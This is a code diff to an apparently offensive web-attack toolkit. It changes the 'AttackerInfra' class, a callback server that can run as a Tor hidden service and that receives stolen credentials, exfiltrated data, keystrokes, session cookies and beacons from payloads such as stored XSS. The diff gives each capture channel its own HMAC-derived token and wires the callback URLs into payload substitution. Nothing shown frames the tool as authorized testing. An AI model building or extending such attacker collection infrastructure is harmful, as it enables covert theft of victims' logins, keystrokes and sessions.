@@ -5,7 +5,7 @@ Toolkit — Interactive Launcher
 from __future__ import annotations
 import os, sys
 from pathlib import Path
-from typing import Optional
+from typing import Optional, Dict, List, Tuple, Any, Set
 
 # ── Auto-activate venv if available ─────────────────────────────────────────
 # The toolkit can be launched three ways:
@@ -627,8 +627,30 @@ class AttackerInfra:
         self._started = threading.Event()
         self._captures: list = []
         self._capture_lock = threading.Lock()
-        # 128-bit URL-safe token used for callback path auth.
-        self._token = secrets.token_urlsafe(16)
+        # Master secret for callback URL authentication. All five
+        # callback endpoints (c/x/k/s/b) used to share ONE token, which
+        # meant that any payload leak revealing /c/<tok> handed the
+        # attacker ALL channels (credentials + exfil + keylog + session +
+        # beacon). They're different enough purposes that they should
+        # have different tokens. We now derive a per-kind token via
+        # HMAC-SHA256(master_secret, kind), URL-safe-base64-truncated to
+        # 22 chars (~128 bits of entropy per kind). The master never
+        # appears in URLs, so compromising one channel tells an observer
+        # nothing about the others.
+        self._master_secret = secrets.token_bytes(32)
+        import hmac as _hmac_mod
+        import hashlib as _hashlib_mod
+        import base64 as _b64_mod
+        def _derive(kind: str) -> str:
+            mac = _hmac_mod.new(self._master_secret,
+                                kind.encode("ascii"),
+                                _hashlib_mod.sha256).digest()
+            return _b64_mod.urlsafe_b64encode(mac).decode("ascii").rstrip("=")[:22]
+        self._tokens: Dict[str, str] = {k: _derive(k) for k in "cxksb"}
+        # Back-compat: some callers/tests referenced .token as a single
+        # string. Keep it, pointing at a distinct "default" kind so that
+        # anyone still using it hits the same 'x' channel they used to.
+        self._token = self._tokens["x"]
         # Tor hidden service state
         self._onion_host = None
         self._hs_controller = None
@@ -660,13 +682,22 @@ class AttackerInfra:
         return ""
 
     def get_callback_url(self, kind: str = "x", prefer_onion: bool = True) -> str:
-        """Token-bearing callback URL. kind ∈ {c,x,k,s,b}."""
+        """Token-bearing callback URL. kind ∈ {c,x,k,s,b}. Each kind
+        carries a distinct HMAC-derived token so that leaking one
+        channel does not authorize the others."""
         if kind not in ("c", "x", "k", "s", "b"):
             kind = "x"
         base = self.get_attacker_url(prefer_onion=prefer_onion)
         if not base:
             return ""
-        return f"{base}/{kind}/{self._token}"
+        return f"{base}/{kind}/{self._tokens[kind]}"
+
+    def get_callback_urls(self, prefer_onion: bool = True) -> Dict[str, str]:
+        """Return all five callback URLs keyed by kind. Convenience
+        helper so callers don't have to remember the five-way dict
+        construction each time."""
+        return {k: self.get_callback_url(k, prefer_onion=prefer_onion)
+                for k in "cxksb"}
 
     def get_url(self, filename: str) -> str:
         """Get the serve URL for a generated file. Uses onion when live.
@@ -786,7 +817,7 @@ class AttackerInfra:
             _root_real = os.path.realpath(_root)
             _started_event = self._started
             _add_cap = self._add_capture
-            _token = self._token
+            _tokens = dict(self._tokens)
             _rate_allow = self._rate_allow
             _CALLBACK_KINDS = frozenset(("c", "x", "k", "s", "b"))
 
@@ -874,12 +905,15 @@ class AttackerInfra:
                     kind, tok = segs[0], segs[1]
                     if kind not in _CALLBACK_KINDS:
                         return None
+                    expected = _tokens.get(kind, "")
+                    if not expected:
+                        return None
                     try:
                         import hmac as _hmac
-                        if not _hmac.compare_digest(tok, _token):
+                        if not _hmac.compare_digest(tok, expected):
                             return None
                     except Exception:
-                        if tok != _token:
+                        if tok != expected:
                             return None
                     tail = "/".join(segs[2:])[:2048] if len(segs) > 2 else ""
                     return kind, tail
@@ -3078,26 +3112,29 @@ def _walkthrough_main(exploitable, vulns, tor_proxy, auto_mode,
                  f"http://127.0.0.1:{local_port}")
             break
 
-    # Build callback URLs for payload substitution.
-    callback_urls = {
-        "c": server.get_callback_url("c"),
-        "x": server.get_callback_url("x"),
-        "k": server.get_callback_url("k"),
-        "s": server.get_callback_url("s"),
-        "b": server.get_callback_url("b"),
-    }
-    # If operator picked a custom URL we still use the token from the
-    # local server but rewrite the base.
+    # Build callback URLs for payload substitution. Each kind has its
+    # own HMAC-derived token — leaking /c/<tok> no longer reveals
+    # /x, /k, /s, or /b.
+    callback_urls = server.get_callback_urls(prefer_onion=True)
     if infra_mode == "custom":
-        tok = server.token
-        callback_urls = {k: f"{attacker_url}/{k}/{tok}" for k in "cxksb"}
+        # Operator picked a custom proxy base; keep the per-kind tokens
+        # but rewrite the host portion.
+        _toks = {k: server.get_callback_url(k).rsplit("/", 1)[-1]
+                 for k in "cxksb"}
+        callback_urls = {k: f"{attacker_url}/{k}/{_toks[k]}" for k in "cxksb"}
 
+    _KIND_LABELS = {
+        "c": "credentials",
+        "x": "exfil",
+        "k": "keylog",
+        "s": "session",
+        "b": "beacon",
+    }
     print()
     info(f"Attacker base:    {attacker_url}")
-    info(f"Capture token:    {server.token}  (in callback URLs)")
-    info(f"Callback /c:      {callback_urls['c']}")
-    info(f"Callback /x:      {callback_urls['x']}")
-    info(f"Beacon   /b:      {callback_urls['b']}")
+    info("Callback endpoints (each has a distinct HMAC-derived token):")
+    for _k in "cxksb":
+        info(f"  /{_k} ({_KIND_LABELS[_k]:<12s}) {callback_urls[_k]}")
 
     # Heads-up if the attacker base is loopback-only. Anything that relies
     # on [ATTACKER]/... callbacks (stored XSS payloads, cookie-exfil,
